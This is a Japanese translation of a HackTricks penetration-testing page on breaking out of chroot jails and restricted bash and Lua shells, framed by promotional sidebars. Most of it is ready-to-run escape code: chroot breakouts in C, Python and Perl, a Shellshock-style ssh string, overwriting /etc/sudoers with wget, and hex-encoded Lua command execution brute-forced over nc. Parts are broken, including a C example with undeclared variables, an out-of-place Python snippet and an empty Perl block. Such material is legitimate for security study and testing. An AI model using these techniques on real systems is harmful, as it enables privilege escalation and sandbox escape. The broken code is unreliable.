# Jails からの脱出

<details>

<summary><strong>AWS ハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegram グループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを**共有する**。

</details>

## **GTFOBins**

**"Shell" プロパティを持つ任意のバイナリを実行できるかどうかを** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **で検索する**

## Chroot 脱出

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) から: chroot メカニズムは、意図的な改ざんに対して防御するためには**意図されていません**。特に**特権**（**root**）**ユーザー**による。ほとんどのシステムでは、chroot コンテキストは適切に積み重ならず、十分な権限を持つ chrooted プログラムは、脱出するために二度目の chroot を実行することができます。\
通常、これは chroot 内で root である必要があることを意味します。

{% hint style="success" %}
**ツール** [**chw00t**](https://github.com/earthquake/chw00t) は、以下のシナリオを悪用して `chroot` から脱出するために作成されました。
{% endhint %}

### Root + CWD

{% hint style="warning" %}
chroot 内で **root** であれば、**新しい chroot を作成することで脱出できます**。これは、2つの chroot が（Linux では）共存できないためです。新しいフォルダを作成し、その新しいフォルダに**新しい chroot** を作成すると、**それの外側にいる**あなたは、新しい chroot の**外側にいる**ことになり、したがって FS にいることになります。

これは、通常 chroot は指定されたディレクトリに作業ディレクトリを移動**しない**ために発生します。したがって、chroot を作成しても、その外側にいることができます。
{% endhint %}

通常、chroot ジェイル内に `chroot` バイナリは見つかりませんが、バイナリを**コンパイル、アップロード、実行する**ことができます：

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>

Pythonを使用して制限されたbashシェルから脱出する方法はいくつかあります。最も一般的な方法の1つは、Pythonの`os.system`関数を使用して新しいシェルを起動することです。

```python
python -c 'import os; os.system("/bin/sh")'
```

このコマンドは、Pythonを介して`/bin/sh`を実行し、制限されたbash環境から脱出します。

</details>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
<details>

<summary>Perl</summary>

</details>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + 保存されたfd

{% hint style="warning" %}
これは前のケースと似ていますが、このケースでは**攻撃者が現在のディレクトリへのファイルディスクリプタを保存**し、その後**新しいフォルダでchrootを作成**します。最終的に、chrootの**外側**でその**FD**に**アクセス**できるため、アクセスして**脱出**します。
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FDはUnix Domain Socketsを介して渡すことができるため、以下の手順を実行します。

* 子プロセスを作成（fork）
* 親子プロセスが通信できるようにUDSを作成
* 子プロセスで異なるフォルダにchrootを実行
* 親プロセスで、新しい子プロセスのchroot外にあるフォルダのFDを作成
* そのFDをUDSを使用して子プロセスに渡す
* 子プロセスはそのFDにchdirし、chrootの外にあるため、脱獄する
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* ルートデバイス（/）をchroot内のディレクトリにマウント
* そのディレクトリにchrootする

これはLinuxで可能です
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* chroot内のディレクトリにprocfsをマウント（まだされていない場合）
* 異なるroot/cwdエントリを持つpidを探す、例えば：/proc/1/root
* そのエントリにchrootする
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Fork（子プロセス）を作成し、FS内のより深いフォルダにchrootし、CDを実行
* 親プロセスから、子プロセスがいるフォルダを子プロセスのchrootより前のフォルダに移動
* この子プロセスは自分がchrootの外にいることに気づく
{% endhint %}

### ptrace

{% hint style="warning" %}
* 以前はユーザーが自分のプロセスを自分自身のプロセスからデバッグできましたが、これはデフォルトではもう可能ではありません
* それでも可能であれば、プロセスにptraceしてシェルコードを実行できます（[この例を参照](linux-capabilities.md#cap_sys_ptrace)）。
{% endhint %}

## Bash Jails

### Enumeration

ジェイルに関する情報を取得します：
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### PATHの変更

PATH環境変数を変更できるか確認してください
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vimの使用
```bash
:set shell=/bin/sh
:shell
```
### スクリプトの作成

実行可能なファイルを _/bin/bash_ の内容で作成できるか確認してください
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSHからbashを取得する

ssh経由でアクセスしている場合、このトリックを使用してbashシェルを実行できます:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### 宣言
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

例えばsudoersファイルを上書きすることができます
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### その他のテクニック

以下のページでは、制限されたLinuxシェルからの脱出テクニックについて説明しています。

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**また、以下のページも参考になるでしょう：**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Python Jails

Python jailsから脱出するテクニックについては、以下のページを参照してください：

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

Lua内でアクセス可能なグローバル関数については、このページを参照してください： [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**コマンド実行を伴うEval:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
**ドットを使用せずにライブラリの関数を呼び出すためのいくつかのコツ：**
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
ライブラリの関数を列挙する：
```bash
for k,v in pairs(string) do print(k,v) end
```
```markdown
前述のワンライナーを**異なるlua環境で実行するたびに、関数の順序が変わる**ことに注意してください。したがって、特定の関数を実行する必要がある場合は、異なるlua環境をロードしてライブラリの最初の関数を呼び出すことにより、ブルートフォース攻撃を行うことができます：
```
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**インタラクティブなluaシェルを取得する**: 制限されたluaシェル内にいる場合、次の呼び出しによって新しいluaシェル（そして願わくば無制限の）を取得できます:
```bash
debug.debug()
```
## 参考文献

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (スライド: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)や [**telegram グループ**](https://t.me/peass)に**参加する**、または **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを**共有する**。

</details>
